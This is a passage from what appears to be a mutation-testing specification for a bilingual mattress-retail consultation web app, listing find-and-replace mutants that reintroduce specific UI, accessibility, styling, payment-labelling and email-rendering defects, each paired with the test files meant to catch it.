  // ==== Slice 5 — Sleep Plan (owner rulings 2026-08-21) ======================
  // Each mutant restores one specific defect the slice exists to abolish, or
  // breaks one invariant the slice adds. Each must APPLY (a stale find-string
  // is a failure) and be KILLED by the observer named on its line.

  // --- finalist provenance (D5b, R-1) -------------------------------------
  ["plan: the resolver promotes saved[0] again when no favorite matches",
    "      if (chosen) return { kind: 'chosen', item: chosen };\n      return { kind: 'none', item: null };",
    "      if (chosen) return { kind: 'chosen', item: chosen };\n      if (saved.length) return { kind: 'chosen', item: saved[0] };\n      return { kind: 'none', item: null };", PLAN_WITH_PHASE1],
  ["plan: the resolver coerces a non-string favorite to a string (a number 42 would match a pick id '42')",
    "      if (typeof favId !== 'string' || favId.trim() === '') favId = null;",
    "      favId = (favId === null || favId === undefined) ? null : String(favId);", PLAN],
  // The two blank guards (favorite side, pick side) are DEFENCE IN DEPTH:
  // dropping either alone is an equivalent mutation (the other still
  // refuses), so the honest mutant drops BOTH — which restores the C12
  // pattern: a blank favorite becomes an identity and meets a blank pick id.
  ["plan: both blank guards are dropped (a blank favorite is an identity and matches a blank pick id — C12 restored)",
    "      if (typeof favId !== 'string' || favId.trim() === '') favId = null;\n      var chosen = null;\n      if (favId !== null) {\n        for (var i = 0; i < saved.length; i++) {\n          var pid = saved[i].id;\n          if (typeof pid === 'string' && pid.trim() !== '' && pid === favId) { chosen = saved[i]; break; }",
    "      if (typeof favId !== 'string') favId = null;\n      var chosen = null;\n      if (favId !== null) {\n        for (var i = 0; i < saved.length; i++) {\n          var pid = saved[i].id;\n          if (pid === favId) { chosen = saved[i]; break; }", PLAN],
  ["plan: the resolver no longer tolerates a malformed _savedPicks (Array.isArray dropped)",
    "      var saved = Array.isArray(window._savedPicks)\n        ? window._savedPicks.filter(function(p) { return !!p && typeof p === 'object'; })\n        : [];",
    "      var saved = (window._savedPicks || []).filter(function(p) { return !!p && typeof p === 'object'; });", PLAN],
  ["plan: the resolver returns a bare item instead of a discriminated {kind, item}",
    "      if (chosen) return { kind: 'chosen', item: chosen };",
    "      if (chosen) return chosen;", PLAN],
  ["plan: un-saving the chosen mattress on Results no longer clears the finalist (the two-tap orphan returns)",
    "      if (!willBeSaved && window._favoriteMattressId === mattressId) {\n        window._favoriteMattressId = '';",
    "      if (false) {\n        window._favoriteMattressId = '';", PLAN],
  ["plan: saving alone chooses a finalist",
    "      if (typeof window._updatePicksBadge === 'function') window._updatePicksBadge();\n      if (analytics) analytics.log('save_pick_toggle'",
    "      if (willBeSaved) window._favoriteMattressId = mattressId;\n      if (typeof window._updatePicksBadge === 'function') window._updatePicksBadge();\n      if (analytics) analytics.log('save_pick_toggle'", PLAN],
  ["plan: choosing a finalist no longer ensures the mattress is saved",
    "      if (!isSaved) {\n        window._toggleSavePick(mattressId);",
    "      if (false) {\n        window._toggleSavePick(mattressId);", PLAN],
  ["plan: the Sleep System anchor labels the recommended starting point as the finalist again",
    "escapeHtml(kind === 'chosen' ? t('finalist.building_around_finalist') : t('finalist.building_around_recommended'))",
    "escapeHtml(t('finalist.building_around_finalist'))", PLAN],
  ["plan: the drawer labels a mere save as a finalist again",
    'ontouchend="event.preventDefault();window.saveDrawerPick();">Save for later</button>',
    'ontouchend="event.preventDefault();window.saveDrawerPick();">Save as Finalist</button>', PLAN],
  ["plan: the Results finalist control is dropped from the supporting-card cluster",
    "          +       detailsBtn\n          +       compareBtn\n          +       finalistBtn\n          +       saveBtn",
    "          +       detailsBtn\n          +       compareBtn\n          +       saveBtn", PLAN],

  // --- priorities all-or-nothing (R-8) ------------------------------------
  ["plan: the Consultation Summary filters malformed priorities per element again",
    "      var stored = (typeof analytics !== 'undefined') ? analytics.trialFocus : undefined;\n      if (!trialFocusIsComplete(stored)) {",
    "      var stored = ((typeof analytics !== 'undefined' && Array.isArray(analytics.trialFocus)) ? analytics.trialFocus : []).filter(function(item) { return item && item.why && item.test; });\n      if (!stored.length) {", PRIORITIES],
  ["plan: the producer stores a partially-shaped collection instead of failing closed",
    "      analytics.trialFocus = trialFocusIsComplete(builtTrialFocus) ? builtTrialFocus : [];",
    "      analytics.trialFocus = builtTrialFocus;", PRIORITIES],
  ["plan: the Plan renders malformed priorities partially (filter instead of fail-closed)",
    "      if (!sleepPlanTrialFocusIsComplete(stored)) {\n        // R-8: ALL-OR-NOTHING.",
    "      stored = (Array.isArray(stored) ? stored : []).filter(function(x) { return x && x.why && x.test; });\n      if (!stored.length) {\n        // R-8: ALL-OR-NOTHING.", PLAN],
  ["plan: the forward control is no longer withheld while priorities are invalid",
    "      if (cont) cont.hidden = !!window._sleepPlanState.prioritiesInvalid;",
    "      if (cont) cont.hidden = false;", PLAN],
  ["plan: Continue proceeds while priorities are invalid",
    "      if (window._sleepPlanState.prioritiesInvalid) return;\n      window.showSavedPicks();",
    "      window.showSavedPicks();", PLAN],

  // --- accessories: consume, never re-derive (projection A) ---------------
  ["plan: the Plan renderer calls the scorer instead of the side-effect-free accessor",
    "      var groups = readSleepSystemGroups();\n      var items = (groups.pillow || []).concat(groups.protection || []);",
    "      var scored = scoreAccessoriesFromAnswers();\n      var items = scored.filter(function(a) { return sleepSystemStepForItem(a) === 'pillow' || sleepSystemStepForItem(a) === 'protection'; });", PLAN],
  ["plan: the Plan re-sorts the engine's items by score",
    "      var items = (groups.pillow || []).concat(groups.protection || []);",
    "      var items = (groups.pillow || []).concat(groups.protection || []).slice().sort(function(a, b) { return (b.score || 0) - (a.score || 0); });", PLAN],
  ["plan: the Plan filters on matched",
    "      var items = (groups.pillow || []).concat(groups.protection || []);",
    "      var items = (groups.pillow || []).concat(groups.protection || []).filter(function(a) { return a.matched; });", PLAN],
  ["plan: the Plan filters on meetsMatchThreshold",
    "      var items = (groups.pillow || []).concat(groups.protection || []);",
    "      var items = (groups.pillow || []).concat(groups.protection || []).filter(function(a) { return a.meetsMatchThreshold; });", PLAN],
  ["plan: the Plan removes added items instead of overlaying them",
    "      var items = (groups.pillow || []).concat(groups.protection || []);",
    "      var items = (groups.pillow || []).concat(groups.protection || []).filter(function(a) { return !(window._accCart || {})[a.id]; });", PLAN],
  ["plan: the Plan caps the engine's list at three",
    "      var items = (groups.pillow || []).concat(groups.protection || []);",
    "      var items = (groups.pillow || []).concat(groups.protection || []).slice(0, 3);", PLAN],
  ["plan: the Plan substitutes protection-then-pillow order",
    "      var items = (groups.pillow || []).concat(groups.protection || []);",
    "      var items = (groups.protection || []).concat(groups.pillow || []);", PLAN],
  ["plan: the accessor writes analytics during a read",
    "      return groups;\n    }\n\n    // Fixture-facing view model, retained by name and shape.",
    "      analytics.recommendedAccessories = groups.pillow;\n      return groups;\n    }\n\n    // Fixture-facing view model, retained by name and shape.", PLAN_WITH_PHASE1],
  ["plan: the accessor memoizes its first read (stale language, stale answers)",
    "    function readSleepSystemGroups() {\n      var scored = Array.isArray(ACCESSORIES) ? scoreAccessoriesFromAnswers() : [];",
    "    var _planGroupsMemo = null;\n    function readSleepSystemGroups() {\n      if (_planGroupsMemo) return _planGroupsMemo;\n      var scored = Array.isArray(ACCESSORIES) ? scoreAccessoriesFromAnswers() : [];", PLAN],

  // --- compared models = _compareSelected membership ----------------------
  ["plan: the compared block reads the saved picks instead of the comparison selection",
    "      var ids = Array.isArray(window._compareSelected) ? window._compareSelected : [];\n      var rows = [];",
    "      var ids = (Array.isArray(window._savedPicks) ? window._savedPicks : []).map(function(p) { return p && p.id; });\n      var rows = [];", PLAN],
  ["plan: the compared block renders nothing",
    "      box.innerHTML = rows.length ? rows.join('')",
    "      box.innerHTML = false ? rows.join('')", PLAN],

  // --- routes, lifecycle, registration ------------------------------------
  ["plan: showSleepPlan shows before it renders (heading empty at focus time)",
    "      renderSleepPlan();\n      showScreen('sleepPlanScreen');",
    "      showScreen('sleepPlanScreen');\n      renderSleepPlan();", PLAN],
  ["plan: 'Choose a finalist' routes to the Consultation Summary instead of Results",
    "    window.sleepPlanChooseFinalist = function() {\n      if (!_resultsState) return;\n      _renderResults();\n      showScreen('resultsScreen');",
    "    window.sleepPlanChooseFinalist = function() {\n      if (!_resultsState) return;\n      window.showSavedPicks(); return;\n      showScreen('resultsScreen');", PLAN],
  ["plan: email 'Back to handoff' is re-targeted through the Plan",
    'id="emailConfirmBackHandoff" onclick="window.showSavedPicks()"',
    'id="emailConfirmBackHandoff" onclick="window.showSleepPlan(\'email\')"', PLAN],
  ["plan: the floating Selections pill opens the Plan",
    '          id="savedPicksBtn"\n          onclick="window.showSavedPicks()"',
    '          id="savedPicksBtn"\n          onclick="window.showSleepPlan(\'pill\')"', PLAN],
  ["plan: the Plan's own state is no longer cleared by the wipe",
    "        window._sleepPlanState = { prioritiesInvalid: false, origin: '' };\n        if (typeof window.updateCompareTray === 'function') window.updateCompareTray();",
    "        if (typeof window.updateCompareTray === 'function') window.updateCompareTray();", PLAN],
  ["plan: a language switch leaves the Plan in the previous language",
    "      if (sleepPlanScreen && sleepPlanScreen.classList.contains('active')) {\n        renderSleepPlan();\n      }",
    "      if (false) {\n        renderSleepPlan();\n      }", PLAN],
  ["plan: the screen is removed from SCREEN_NAME_KEYS (anonymous to assistive technology)",
    "      accessoriesScreen: 'screen.sleep_system',\n      sleepPlanScreen: 'screen.sleep_plan'",
    "      accessoriesScreen: 'screen.sleep_system'", PLAN_WITH_SESSION],
  ["plan: the screen is removed from SCREEN_HEADING_IDS",
    "      accessoriesScreen: 'sleepSystemTitle',\n      // Slice 5: renderSleepPlan() runs before showScreen('sleepPlanScreen'),\n      // so the heading is rendered in the current language at focus time.\n      sleepPlanScreen: 'sleepPlanTitle'",
    "      accessoriesScreen: 'sleepSystemTitle'", PLAN],
  ["plan: a ninth .screen container is added and registered nowhere",
    '  <div class="screen" id="sleepPlanScreen" role="region">',
    '  <div class="screen" id="ghostScreen" role="region"></div>\n  <div class="screen" id="sleepPlanScreen" role="region">', SESSION],
  ["plan: a wipe-inventory id is typo'd to an element that does not exist",
    "      { id: 'financingSheet', hiddenAttr: true },",
    "      { id: 'financingSheeet', hiddenAttr: true },", INTEGRITY],
  ["plan: a hardcoded bilingual literal bypasses the dictionary on the Plan",
    "      label.textContent = t('plan.system_label');",
    "      label.textContent = currentLang === 'es' ? 'Tu Sistema de Sueño' : 'Your Sleep System';", PLAN],

  // --- payment (R-3 A) ----------------------------------------------------
  ["plan: the Plan's explore control emits the misreporting 'handoff' placement",
    "onclick=\"window.openFinancingSheet(\\'sleep-plan\\')\" ",
    "onclick=\"window.openFinancingSheet(\\'handoff\\')\" ", PLAN_WITH_PAY],
  ["plan: 'sleep-plan' is dropped from the placement enum (payload silently gutted)",
    "'mexico', 'sleep-system', 'sleep-plan'],",
    "'mexico', 'sleep-system'],", PAY],
  ["plan: the Plan's payment renderer records exploration on render",
    "      document.getElementById('sleepPlanFinancingInterest').innerHTML =",
    "      paths.forEach(function(p) { payRecordExplored(p.id); });\n      document.getElementById('sleepPlanFinancingInterest').innerHTML =", PAY],
  ["plan: the Plan wrapper takes its own payPref write (second owner)",
    "    window.setPaymentNotNowFromPlan = function() {\n      _payNotNowSurface = 'plan';",
    "    window.setPaymentNotNowFromPlan = function() {\n      payPref = PAY_NOT_NOW;\n      _payNotNowSurface = 'plan';", PAY_WITH_SESSION],
  // Twin of the handoff aria-pressed mutant, on the PLAN's own control. The
  // handoff renderers now precede the Plan's in the file, so the original
  // handoff entries keep their short anchors; this one is Plan-unique.
  ["plan: the Plan's Not right now loses aria-pressed",
    "id=\"sleepPlanFinancingNotNow\" '\n        + 'aria-pressed=\"' + (notNow ? 'true' : 'false') + '\" '",
    "id=\"sleepPlanFinancingNotNow\" '\n        + ''", PAY],
  ["plan: the announcement region for the Plan is never live",
    "      if (regionId === 'sleepPlanFinancingStatus') return finPlanVisible();",
    "      if (regionId === 'sleepPlanFinancingStatus') return false;", PAY],
  // External review at eb7b124 (two P2s, both fixed): the recommended starting
  // point lost its tier (showResults() never stamps one on the bucket entries),
  // and the Consultation Summary's "Chosen" control toggled the finalist OFF.
  ["plan: the recommended fallback returns the raw bucket entry again (no tier -> blank tier-and-position line)",
    "        return Object.assign({}, _resultsState.tierData.gold[0], { tier: 'gold' });",
    "        return _resultsState.tierData.gold[0];", PLAN],
  ["plan: the recommended fallback stamps the tier onto the engine's shared entry (mutates tierData)",
    "        return Object.assign({}, _resultsState.tierData.gold[0], { tier: 'gold' });",
    "        _resultsState.tierData.gold[0].tier = 'gold'; return _resultsState.tierData.gold[0];", PLAN],
  ["plan: the Consultation Summary's finalist control toggles the current finalist OFF again",
    "    window.toggleFavoriteMattress = function(mattressId) {\n      window.chooseFinalist(mattressId);",
    "    window.toggleFavoriteMattress = function(mattressId) {\n      if (window._favoriteMattressId === mattressId) { window._favoriteMattressId = ''; } else window.chooseFinalist(mattressId);", PLAN],
  // Owner ruling 2026-08-23 (C10): neutral trial-priority prose. Observed by the
  // Plan suite's no-finalist honesty checks, the Sleep Brief pin and the Phase 1
  // output fixture (the prose is engine output).
  ["plan: the 'Comfortable elevation' testing prose calls the mattress 'the finalist' again (EN)",
    "          'Try the mattress flat, then with the head gently raised on an adjustable base.',",
    "          'Try the finalist flat, then with the head gently raised on an adjustable base.',", PLAN_WITH_PHASE1.concat(["tests/consultation_priorities_check.mjs"])],
  ["plan: the 'Comfortable elevation' testing prose calls the mattress 'el finalista' again (ES)",
    "          'Prueba el colchón plano y luego con la cabeza ligeramente elevada en una base ajustable.'",
    "          'Prueba el finalista plano y luego con la cabeza ligeramente elevada en una base ajustable.'", PLAN_WITH_PHASE1.concat(["tests/consultation_priorities_check.mjs"])],
  ["plan: the Consultation Summary's saved-picks hint calls every saved pick a finalist again (inline literal restored)",
    "        hf2FinalistsHint: t('hf2.saved_picks_hint'),",
    "        hf2FinalistsHint: es ? 'Los finalistas guardados se envían; las sugerencias son opciones para comparar.' : 'Saved finalists are sent; suggestions remain comparison options.',", PLAN],
  // --- Sleep Plan layout + theme (hotfix 2026-08-23) --------------------------
  // The Plan shipped with no CSS of its own (flex-row on the dark theme on the
  // deployed preview). Each mutant re-creates one half of that omission; the
  // static pins in sleep_plan_check must catch every one. The rendered proof
  // (tests/sleep_plan_layout_check.py) is a separate CI step, not an observer.
  ["plan-layout: the Plan loses hf2's column override (flex-row default returns)",
    "    #hf2Screen.active,\n    #sleepPlanScreen.active {\n      flex-direction: column;",
    "    #hf2Screen.active {\n      flex-direction: column;", PLAN],
  ["plan-layout: the Plan leaves the warm work-theme token group (dark root tokens return)",
    "    body:has(#resultsScreen.active),\n    body:has(#sleepPlanScreen.active),\n    body:has(#hf2Screen.active),",
    "    body:has(#resultsScreen.active),\n    body:has(#hf2Screen.active),", PLAN],
  ["plan-layout: the Plan leaves the warm background/ink group",
    "    #resultsScreen.active,\n    #sleepPlanScreen.active,\n    #hf2Screen.active,\n    #accessoriesScreen.active {",
    "    #resultsScreen.active,\n    #hf2Screen.active,\n    #accessoriesScreen.active {", PLAN],
  ["plan-layout: the section-label ink rule drops the Plan (labels fall back to the theme token)",
    "    #hf2Screen .hf2-review-section__label,\n    #sleepPlanScreen .hf2-review-eyebrow,\n    #sleepPlanScreen .hf2-review-section__label {",
    "    #hf2Screen .hf2-review-section__label {", PLAN],
  ["plan-layout: one hf2-scoped rule for a shared class stops naming the Plan (theme parity)",
    "    #hf2Screen .hf2-review-section,\n    #sleepPlanScreen .hf2-review-section {\n      background: #FFFDF8;",
    "    #hf2Screen .hf2-review-section {\n      background: #FFFDF8;", PLAN],
  ["plan-layout: the Continue button loses its store-primary restatement (falls to --color-bg on --color-accent, 3.67:1)",
    "    #sleepPlanScreen .hf2-send-btn {\n      background: var(--store-primary);\n      color: var(--on-store-primary);\n    }",
    "", PLAN],

  // --- Slice 6 ---------------------------------------------------------------
  // C2/C4: the Summary read model, the composed lead line, the honest hints.
  ["slice6: the Results CTA lies about its destination again",
    "document.getElementById('reviewWithCustomerBtn').textContent = es ? 'Revisar Plan de Sue\u00f1o \u2192' : 'Review Sleep Plan \u2192';",
    "document.getElementById('reviewWithCustomerBtn').textContent = es ? 'Revisar con el cliente \u2192' : 'Review with customer \u2192';", PLAN],
  ["slice6: the Summary retitles back to the Plan's name",
    "        hf2ReviewTitle: es ? 'Tu Resumen de Consulta' : 'Your Consultation Summary',",
    "        hf2ReviewTitle: es ? 'Revisa Tu Plan de Sue\u00f1o' : 'Review Your Sleep Plan',", PLAN],
  ["slice6: the secondary Plan action loses its route",
    "              onclick=\"window.showSleepPlan('summary')\"",
    "              onclick=\"void 0\"", PLAN],
  ["slice6: the attribution line hardcodes a retailer string",
    "        var attrText = storeName() ? (attrSub ? storeName() + ' \u00b7 ' + attrSub : storeName()) : '';",
    "        var attrText = 'Sleep Shop';", PLAN],
  ["slice6: the picks list regrows the favourite-first sort",
    "      var resolved = saved.map(function(p) {",
    "      var resolved = saved.slice().sort(function(a, b) { return a.id === window._favoriteMattressId ? -1 : 1; }).map(function(p) {", PLAN],
  ["slice6: the pick card re-derives reason prose again",
    "      var line = sleepPlanModelLine(Object.assign({}, m, { tier: tier }));",
    "      var line = buildMattressPriorities(m).length ? buildMattressPriorities(m)[0].title : sleepPlanModelLine(Object.assign({}, m, { tier: tier }));",
    PLAN.concat(["tests/results_presentation_check.mjs"])],
  ["slice6: the system block re-scores suggestions again",
    "      var cartItems = (typeof ACCESSORIES !== 'undefined' ? ACCESSORIES : []).filter(function(a) {",
    "      var scored = scoreAccessoriesFromAnswers();\n      var cartItems = (typeof ACCESSORIES !== 'undefined' ? ACCESSORIES : []).filter(function(a) {", PLAN],
  ["slice6: the lead line claims a finalist for the recommended state",
    "        lead = rec ? t('hf2.lead_recommended', { pick: pickText(rec) }) : t('hf2.lead_none');",
    "        lead = rec ? t('hf2.lead_chosen', { pick: pickText(rec) }) : t('hf2.lead_none');", PLAN],
  ["slice6: the lead line's payment fragment stops mirroring the D4 derivation (stale ids leak)",
    "        if (!prefLabel) prefLabel = FC('preferenceNone');\n        payment = t('hf2.pay_state', { value: prefLabel });",
    "        payment = t('hf2.pay_state', { value: payPref || FC('preferenceNone') });", PLAN],
  ["slice6: a payment tap leaves the lead line stale (the financing-surfaces hook is dropped)",
    "      if (typeof renderHf2LeadLine === 'function') renderHf2LeadLine();",
    "", PLAN],
  ["slice6: the lead line leaves the wipe's text inventory",
    "      'hf2LeadLine',\n      'hf2FinancingStatus', 'financingSheetStatus', 'financingSheetAction',",
    "      'hf2FinancingStatus', 'financingSheetStatus', 'financingSheetAction',", PLAN_WITH_SESSION],
  // C3: comparison persistence.
  ["slice6: closing the review-origin modal clears the selection again",
    "      if (window._compareOrigin === 'review') {\n        window._compareOrigin = '';\n      }",
    "      if (window._compareOrigin === 'review') {\n        window._compareOrigin = '';\n        window.clearCompare();\n      }",
    ["tests/compare_modal_check.mjs"]],
  ["slice6: the Summary compare overwrites an existing complete pair again",
    "      var existing = Array.isArray(window._compareSelected) ? window._compareSelected : [];\n      if (existing.length !== 2) {",
    "      var existing = [];\n      if (existing.length !== 2) {",
    ["tests/compare_modal_check.mjs"]],
  // C5: the repaired tier-line ink.
  ["slice6: the pick-card tier line falls back below the contrast floor",
    "      letter-spacing: 0.18em;\n      color: var(--accent-ink);",
    "      letter-spacing: 0.18em;\n      color: var(--color-accent);",
    ["tests/contrast_check.mjs"]],
  // Cohesion C4 (2026-08-30): the text-hugging heading focus treatment.
  ["cohesion C4: the heading ring offset drops below the ruled 4px minimum",
    "      outline-offset: 5px;\n      box-shadow: 0 0 0 8px var(--focus-ring-inner);",
    "      outline-offset: 2px;\n      box-shadow: 0 0 0 5px var(--focus-ring-inner);",
    ["tests/contrast_check.mjs"]],
  ["cohesion C4: the heading ring stops hugging the text (full-width block again)",
    "      width: -webkit-fit-content;\n      width: fit-content;\n      max-width: 100%;\n      margin-inline: auto;\n      outline: 3px solid var(--focus-ring-outer);",
    "      outline: 3px solid var(--focus-ring-outer);",
    ["tests/contrast_check.mjs"]],
  ["cohesion C4: the heading ring is gated on :focus (rings every touch) instead of :focus-visible",
    "    .noct-results-headline:focus-visible,\n    .noct-email-headline:focus-visible,\n    .sleep-system__title:focus-visible,\n    .hf2-review-title:focus-visible {\n      width: -webkit-fit-content;",
    "    .noct-results-headline:focus,\n    .noct-email-headline:focus,\n    .sleep-system__title:focus,\n    .hf2-review-title:focus {\n      width: -webkit-fit-content;",
    ["tests/contrast_check.mjs"]],
  ["cohesion C4: the heading forced-colors fallback is dropped",
    "    @media (forced-colors: active) {\n      .noct-results-headline:focus-visible,\n      .noct-email-headline:focus-visible,\n      .sleep-system__title:focus-visible,\n      .hf2-review-title:focus-visible {\n        outline-color: CanvasText;\n        box-shadow: none;\n      }\n    }\n",
    "",
    ["tests/contrast_check.mjs"]],
  ["cohesion C4: the heading ring leaves the semantic token pair for a raw colour",
    "      outline: 3px solid var(--focus-ring-outer);\n      outline-offset: 5px;",
    "      outline: 3px solid #2F271E;\n      outline-offset: 5px;",
    ["tests/contrast_check.mjs"]],
  // C6: the Welcome removals.
  ["slice6: the Payment Choice tease returns to the Welcome",
    "      var teaseRow = document.querySelector('.landing-discount-tease');\n      if (savingsPassEnabled()) {",
    "      var teaseRow = document.querySelector('.landing-discount-tease');\n      if (financingEnabled()) {\n        if (teaseRow) teaseRow.hidden = false;\n      } else if (savingsPassEnabled()) {", PLAN],
  // C9: the payload gate, the lead contract, the provenance label.
  ["slice6: the payload gate ships a partial priorities block again",
    "          return entries.length > 0 && entries.every(whole) ? entries : [];",
    "          return entries;", PRIORITIES],
  ["slice6: the payload gate accepts whitespace-only fields",
    "            return p.name.trim().length > 0 && p.reason.trim().length > 0 && p.test.trim().length > 0;",
    "            return p.name.length > 0 && p.reason.length > 0 && p.test.length > 0;", PRIORITIES],
  ["slice6: the payload lead silently promotes the first saved pick again",
    "        kind: _leadItem ? (_finalist.kind === 'chosen' ? 'chosen' : 'recommended') : 'none',",
    "        kind: 'chosen',", PLAN],
  ["Code.gs: the server gate ships a partial priorities block again",
    "        return list.length > 0 && list.every(whole) ? list : [];",
    "        return list.filter(function(p) { return p.name; });", EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the lead enum stops failing closed",
    "      var kind = ok && (l.kind === 'chosen' || l.kind === 'recommended') ? l.kind : 'none';",
    "      var kind = ok ? String(l.kind || 'none') : 'none';", EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: a lead without a name keeps its claim",
    "      if (!leadName) kind = 'none';",
    "", EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: matchesSource fails open to 'saved'",
    "    var matchesSource = data.matchesSource === 'saved' ? 'saved' : 'recommended';",
    "    var matchesSource = data.matchesSource === 'recommended' ? 'recommended' : 'saved';", EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the hero promotes matches[0] again",
    "  var heroCard = (data.lead && data.lead.kind !== 'none') ? leadCard(data.lead) : '';",
    "  var heroCard = matches.length ? leadCard({ kind: 'chosen', name: matches[0].name, brand: matches[0].brand, line: '', imageUrl: matches[0].imageUrl }) : '';",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the percentage chip returns to the cards",
    "    var matchLine = line || (meets ? '' : L.comparisonOption);",
    "    var matchLine = meets ? _escapeHtml(m.matchPct || '') + '% match' : L.comparisonOption;", EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the sheet row loses its internal percentage record",
    "          ? ' (' + _safeText(m.matchPct, 10) + '%)'",
    "          ? ''", EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the brief prose renders beside a complete priorities block again",
    "        var briefProse = (data.priorities || []).length ? '' : sleepProfile;",
    "        var briefProse = sleepProfile;", EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the plain brief label sits over a blank value again",
    "    if (priorityText || !sleepProfile) return '';",
    "    if (priorityText) return '';", EMAIL_PRIORITIES, "Code.gs"],
  // C12: review-pass repairs stay repaired.
  ["slice6: closing the RSA panel drops focus to body again",
    "      // Closing the panel while it contains the focused control would drop\n      // focus to <body> and make a keyboard/switch user restart from the top\n      // of the document. Mirror the Escape path: focus returns to the strip.\n      var strip = document.getElementById('hf2RsaStripBtn');\n      if (strip && typeof strip.focus === 'function') strip.focus();",
    "      // focus restore retired", PLAN],
  ["slice6: the payload lead's brand stops matching its own list row",
    "        brand: _leadItem ? (String(_leadItem.brand || '')\n          + (_leadItem.subBrand && String(_leadItem.brand || '').indexOf(' \\u00b7 ') === -1\n              ? ' \\u00b7 ' + _leadItem.subBrand : '')) : '',",
    "        brand: _leadItem ? String(_leadItem.brand || '') : '',", PLAN],
  ["Code.gs: the plain list header sits over an empty list again",
    "      + 'Show this email to your ' + storeName + ' sleep specialist.\\n\\n'\n      + (allMatches.length ? _plainListHeader + '\\n' : '')",
    "      + 'Show this email to your ' + storeName + ' sleep specialist.\\n\\n'\n      + _plainListHeader + '\\n'", EMAIL_PRIORITIES, "Code.gs"],
  // Item 1.6 exit clause: the compare control's label must stay honest in
  // every state its enable rule admits (including a persisted pair the
  // customer never saved). EN and ES are separate surfaces: the dictionary
  // files are distinct targets, and the pre-render static markup is a third.
  ["item 1.6: the EN compare label claims 'saved picks' again",
    "\"hf2.compare_saved\": \"Compare mattresses\",",
    "\"hf2.compare_saved\": \"Compare saved picks\",", PLAN, "data/dict-en.json"],
  ["item 1.6: the ES compare label claims 'selecciones guardadas' again",
    "\"hf2.compare_saved\": \"Comparar colchones\",",
    "\"hf2.compare_saved\": \"Comparar selecciones guardadas\",", PLAN, "data/dict-es.json"],
  ["item 1.6: the pre-render markup flashes the retired compare label again",
    ">Compare mattresses</button>",
    ">Compare saved picks</button>", PLAN],
  ["item 1.6: the compare control stops localizing its label",
    "if (compareBtn) compareBtn.textContent = t('hf2.compare_saved');",
    "if (compareBtn) compareBtn.textContent = 'Compare saved picks';", PLAN],
  ["slice6: the reveal handler claims Send in preview mode again",
    "        // C13 (external review, PR #58): the send verb is owned by the ONE\n        // mode-aware renderer. The --revealed class is already set above, so\n        // re-rendering yields the right verb for the mode — preview mode keeps\n        // saying Save/Guardar, never a \"send\" claim while gasUrl is blank.\n        renderHf2SendButton();",
    "        var sendBtn = document.getElementById('hf2SendBtn');\n        if (sendBtn) sendBtn.textContent = es ? 'Enviar Pase y Selecciones' : 'Send Pass & Picks';", PLAN],
  // C7/C8: drawer + RSA accessibility.
  ["slice6: drawer prev/next fall back to focusable-but-inert styling",
    "        prevBtn.disabled = window._drawerCurrentIndex <= 0;\n        nextBtn.disabled = window._drawerCurrentIndex >= window._drawerOrder.length - 1;",
    "        prevBtn.style.opacity = window._drawerCurrentIndex > 0 ? '1' : '0.3';\n        nextBtn.style.opacity = '1';",
    ["tests/drawer_lifecycle_check.mjs"]],
  ["slice6: the reaction painter loses aria-pressed",
    "        btn.setAttribute('aria-pressed', isSelected ? 'true' : 'false');",
    "", ["tests/drawer_lifecycle_check.mjs"]],
  ["slice6: the RSA strip stops deriving aria-expanded from the panel",
    "      var strip = document.getElementById('hf2RsaStripBtn');\n      if (strip) strip.setAttribute('aria-expanded', panel.hasAttribute('hidden') ? 'false' : 'true');",
    "", PLAN],
  ["slice6: the RSA add input leaves the contact wipe",
    "    var SESSION_CONTACT_INPUT_IDS = ['emailNameInput', 'emailInput', 'emailPhoneInput', 'hf2RsaAddInput'];",
    "    var SESSION_CONTACT_INPUT_IDS = ['emailNameInput', 'emailInput', 'emailPhoneInput'];", PLAN],
  // C4: dictionary parity for the new keys (target the ES dictionary).
  ["slice6: a new Summary key goes English-only",
    "  \"hf2.lead_none\": \"A\u00fan no has elegido finalista.\",",
    "", PLAN_WITH_SESSION, "data/dict-es.json"],

  // --- Item 1.4, the Sleep System presentation ------------------------------
  // Each entry restores exactly one defect this item repaired, so a survivor
  // would mean the repair has no effective test. All five name SLEEP.
  ["1.4: the card puts the product distinction back above the customer benefit",
    "              '<div class=\"sleep-system__featured-reason\">' + escapeHtml(reason) + '</div>' +\n              '<p class=\"sleep-system__featured-description\">' + escapeHtml(sleepSystemText(primary.description)) + '</p>' +",
    "              '<p class=\"sleep-system__featured-description\">' + escapeHtml(sleepSystemText(primary.description)) + '</p>' +\n              '<div class=\"sleep-system__featured-reason\">' + escapeHtml(reason) + '</div>' +",
    SLEEP],
  // DOM order alone is not the hierarchy: a benefit rendered smaller than the
  // distinction under it is first in the tree and second on the screen.
  ["1.4: the benefit block shrinks below the product distinction again",
    "      border-left: 3px solid #9A7445;\n      background: #F6EFE4;\n      color: #4F4439;\n      font: 600 14px/1.45 var(--font-sans);",
    "      border-left: 3px solid #9A7445;\n      background: #F6EFE4;\n      color: #4F4439;\n      font: 600 12px/1.45 var(--font-sans);",
    SLEEP],
  ["1.4: the guidance panel echoes the customer benefit again (adjustability, support)",
    "      return notices.slice(0, 3);",
    "      if (primary && primary.reasons && primary.reasons[0]) notices.unshift(primary.reasons[0]);\n      return notices.slice(0, 3);",
    SLEEP],
  // Close-out re-point (2026-08-25): the pillow note was reworded to
  // salesperson voice, so the find string quotes the NEW note; the `\\'`
  // matches the source's escaped apostrophe byte-for-byte.
  ["1.4: the pillow specialist note echoes the customer benefit again",
    "          sleepSystemText({ en: 'Explain how this pillow addresses the customer\\'s priorities.', es: 'Explica c\u00f3mo esta almohada responde a las prioridades del cliente.' }),",
    "          primary && primary.reasons && primary.reasons[0] ? primary.reasons[0] : sleepSystemText({ en: 'Explain how this pillow addresses the customer\\'s priorities.', es: 'Explica c\u00f3mo esta almohada responde a las prioridades del cliente.' }),",
    SLEEP],
  ["1.4: the salesperson procedure region loses its accessible name",
    "      guidance.setAttribute('aria-label', guidanceKind);\n",
    "", SLEEP],

  // --- Item 1.4 close-out (owner ruling 2026-08-25) -------------------------
  // Three CSS-only repairs and one copy repair. Each entry reverts exactly
